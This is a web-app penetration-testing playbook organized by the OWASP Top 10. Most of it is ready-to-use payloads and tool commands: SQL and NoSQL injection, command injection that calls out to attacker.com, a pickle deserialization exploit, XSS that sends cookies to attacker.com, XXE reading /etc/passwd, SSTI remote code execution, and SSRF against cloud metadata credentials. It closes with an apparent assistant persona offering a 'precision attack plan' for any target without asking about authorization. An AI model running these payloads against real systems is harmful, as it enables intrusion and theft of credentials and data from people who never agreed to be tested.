# Web-App-Penetration-Testing-Full-OWASP-Top-10-Playbook

## Pre-Engagement Setup

Before touching the target, get your toolkit ready:

```
Burp Suite Pro | OWASP ZAP | ffuf | sqlmap | nuclei | nikto
gobuster | wfuzz | hydra | john | hashcat | jwt_tool
commix | dalfox | tplmap | ghauri | caido
```

Set Burp as your proxy, turn on passive scanning, and let traffic flow while you manually explore.

---

## A01 — Broken Access Control

This is the #1 finding. Attack vectors:

**IDOR (Insecure Direct Object Reference)**
```
GET /api/user/1001/profile → change to /api/user/1002/profile
GET /invoice/download?id=500 → fuzz id with ffuf
```

**Horizontal & Vertical Privilege Escalation**
```
# Login as low-priv user, capture token
# Access admin endpoints:
GET /admin/users
GET /api/admin/settings
POST /api/user/role {"role":"admin"}
```

**Forced Browsing**
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,asp,aspx,jsp,bak,old,conf
```

**HTTP Method Tampering**
```
GET /admin/delete → try PUT, DELETE, PATCH, OPTIONS, HEAD
```

**Parameter Pollution**
```
?user_id=attacker&user_id=victim
```

---

## A02 — Cryptographic Failures

**Finding sensitive data exposure:**
```bash
# Check for cleartext transmission
curl -v http://target.com  # Is HTTPS enforced?

# Check response headers
curl -I https://target.com | grep -i "strict-transport\|x-content\|x-frame"

# Spider for sensitive files
ffuf -u https://target.com/FUZZ -w wordlist.txt
# Target: .env, .git, backup.zip, db.sql, config.php, id_rsa
```

**Weak crypto in tokens:**
```bash
# Decode JWT
echo "eyJ..." | base64 -d

# Test alg:none attack
jwt_tool TOKEN -X a

# Crack JWT secret
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Check for weak encoding (base64 session tokens)
echo "dXNlcjoxMDA=" | base64 -d  # → user:100
```

---

## A03 — Injection

### SQL Injection
```bash
# Manual detection
' OR '1'='1
' OR 1=1--
1' AND SLEEP(5)--
1; DROP TABLE users--
' UNION SELECT NULL,NULL,NULL--

# sqlmap full automation
sqlmap -u "https://target.com/item?id=1" --dbs --batch --level=5 --risk=3
sqlmap -u "https://target.com/item?id=1" -D dbname --tables
sqlmap -u "https://target.com/item?id=1" -D dbname -T users --dump

# POST body injection
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --level=5

# With cookies/auth
sqlmap -u "https://target.com/api/data" --cookie="session=abc123" --dbs

# Blind time-based
' AND SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'--  (MSSQL)
' AND pg_sleep(5)--          (PostgreSQL)

# Second-order SQLi — inject into profile, trigger on display page
```

### NoSQL Injection (MongoDB)
```bash
# Login bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrongpass"}}

# In URL params
?user[$ne]=foo&pass[$ne]=bar
```

### Command Injection
```bash
# Detection
; whoami
| whoami
`whoami`
$(whoami)
; sleep 5
| ping -c 5 127.0.0.1

# Out-of-band (blind)
; curl http://your-collab.net/$(whoami)
; nslookup $(whoami).attacker.com

# Tool
commix --url="https://target.com/ping?host=INJECT_HERE"
```

### LDAP Injection
```
*)(uid=*))(|(uid=*
admin)(&(password=*)
```

### XPath Injection
```
' or '1'='1
' or 1=1 or ''='
```

---

## A04 — Insecure Design

**Business logic flaws — think like an attacker:**
```
- Negative quantity in shopping cart → credit added
- Skip steps in multi-step workflows (step1 → step3)
- Race conditions: double-spend, duplicate coupon use
- Price manipulation in hidden/client-side form fields
- Password reset flow: is the token tied to the user?
- Can you reset another user's password by manipulating the token delivery?
```

**Race Condition Testing (Turbo Intruder / Python)**
```python
import threading, requests

def send():
    requests.post("https://target.com/redeem", data={"coupon":"SAVE50"}, cookies={"session":"your_token"})

threads = [threading.Thread(target=send) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]
```

---

## A05 — Security Misconfiguration

```bash
# Nikto scan
nikto -h https://target.com -ssl

# Nuclei — huge template library
nuclei -u https://target.com -t /nuclei-templates/ -severity critical,high,medium

# Check security headers
curl -I https://target.com
# Missing: CSP, X-Frame-Options, HSTS, X-Content-Type-Options

# Default credentials on admin panels
admin:admin | admin:password | root:root | test:test

# Exposed paths
/.git/config
/.env
/phpinfo.php
/server-status
/actuator (Spring Boot)
/actuator/env
/actuator/heapdump
/swagger-ui.html
/api-docs
/graphql
/console (H2 database)
/adminer.php
/wp-admin
/jmx-console (JBoss)

# CORS misconfiguration
curl -H "Origin: https://evil.com" -I https://target.com/api/user
# Look for: Access-Control-Allow-Origin: https://evil.com
# + Access-Control-Allow-Credentials: true → account takeover possible
```

---

## A06 — Vulnerable & Outdated Components

```bash
# Fingerprint technologies
whatweb https://target.com
wappalyzer (browser ext)

# Check JS libraries in source
cat *.js | grep -i "version\|jquery\|angular\|react\|bootstrap"

# CVE lookup after fingerprinting
nuclei -u https://target.com -t /nuclei-templates/cves/

# Check package manifests if exposed
/package.json
/composer.json
/requirements.txt
/Gemfile
```

---

## A07 — Identification & Authentication Failures

```bash
# Username enumeration — different response timing/message
# "User not found" vs "Wrong password"

# Brute force (if no lockout)
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# Credential stuffing
ffuf -u https://target.com/login -X POST -d "user=FUZZ&pass=FUZZ2" -w combo_list.txt

# Session fixation
# 1. Get session token before login
# 2. Does it change after authentication? It should.

# Password reset weaknesses
# - Predictable token? (timestamp-based, sequential)
# - Long expiry? (24h+)
# - Token in URL? (Referer header leak)
# - Can token be reused after use?
# - Host header injection in reset email:
Host: evil.com  → link in email points to evil.com

# MFA bypass
# - Response manipulation: change "verified":false → true
# - Try null, 000000, previous OTP
# - Check if OTP is in response body
```

---

## A08 — Software & Data Integrity Failures

**JWT Algorithm Confusion:**
```bash
# RS256 → HS256 attack
# Grab public key, sign with it as HMAC secret
jwt_tool TOKEN -X k -pk public.pem

# alg:none
jwt_tool TOKEN -X a

# JWT kid injection (SQLi in kid header)
{"kid": "' UNION SELECT 'attacker_secret' --"}
```

**Insecure Deserialization:**
```bash
# Java — ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' | base64

# PHP object injection
O:4:"User":1:{s:4:"role";s:5:"admin";}

# Python pickle
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/`whoami`',))
pickle.dumps(Exploit())
```

---

## A09 — Security Logging & Monitoring Failures

This is more of an audit check during pentest:
```
- Can you perform 1000 login attempts with no alert/block?
- Are errors verbose? (stack traces, SQL errors, path disclosure)
- Can log injection be done? (inject newlines in username field)
  username: admin\n2024-01-01 WARN: User admin logged in successfully
```

---

## A10 — Server-Side Request Forgery (SSRF)

```bash
# Detect SSRF-prone parameters
url=, imageUrl=, fetch=, load=, src=, dest=, redirect=, uri=, path=, callback=

# Basic probe
url=http://127.0.0.1/
url=http://localhost/admin
url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://metadata.google.internal/computeMetadata/v1/  (GCP)
url=http://169.254.169.254/metadata/instance  (Azure)

# Bypass filters
url=http://0x7f000001/          # hex IP
url=http://0177.0.0.1/          # octal
url=http://[::1]/               # IPv6 localhost
url=http://spoofed.attacker.com # DNS rebinding
url=http://127.1/               # short form
url=http://①②⑦.0.0.1          # unicode

# Blind SSRF — use Burp Collaborator / interactsh
url=http://your.burpcollaborator.net

# Protocol smuggling
url=file:///etc/passwd
url=dict://127.0.0.1:6379/info  (Redis)
url=gopher://127.0.0.1:25/...   (SMTP)
```

---

## Bonus Attack Vectors Not in OWASP Top 10

### XSS (now under A03 Injection)
```bash
# Reflected
<script>alert(1)</script>
"><svg onload=alert(1)>
'"><img src=x onerror=alert(document.cookie)>

# Stored → hunt comments, profile fields, file names
# DOM-based → look at URL fragments, JS sinks: innerHTML, eval(), document.write()

# XSS to account takeover
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

# CSP bypass
<script src="https://trusted.cdn.com/angular.js"></script>
{{constructor.constructor('alert(1)')()}}  (AngularJS)

# dalfox automation
dalfox url "https://target.com/search?q=FUZZ"
```

### XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- Blind OOB XXE -->
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

<!-- SVG file upload XXE -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

### SSTI (Server-Side Template Injection)
```bash
# Detection — inject math
{{7*7}} → 49 = vulnerable
${7*7}
<%= 7*7 %>
#{7*7}

# Jinja2 (Python/Flask) RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# tplmap automation
tplmap -u "https://target.com/render?name=*"
```

### Open Redirect
```bash
/redirect?url=https://evil.com
/redirect?url=//evil.com
/redirect?url=\/\/evil.com
/redirect?url=%2F%2Fevil.com

# Chain with OAuth for token theft
```

### HTTP Request Smuggling
```bash
# CL.TE or TE.CL desync
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# Use Burp HTTP Request Smuggler extension
```

---

## Reporting Mindset

As a security architect, every finding needs:
- **Risk rating** (CVSS score)
- **Proof of Concept** (screenshots, payloads, curl commands)
- **Business impact** (data breach? account takeover? RCE?)
- **Remediation** (specific fix, not just "sanitize input")

---

What's your current target? Tell me the app stack (PHP/Java/Python/Node), what auth mechanism it uses, and what you've found so far — I'll give you a precision attack plan.
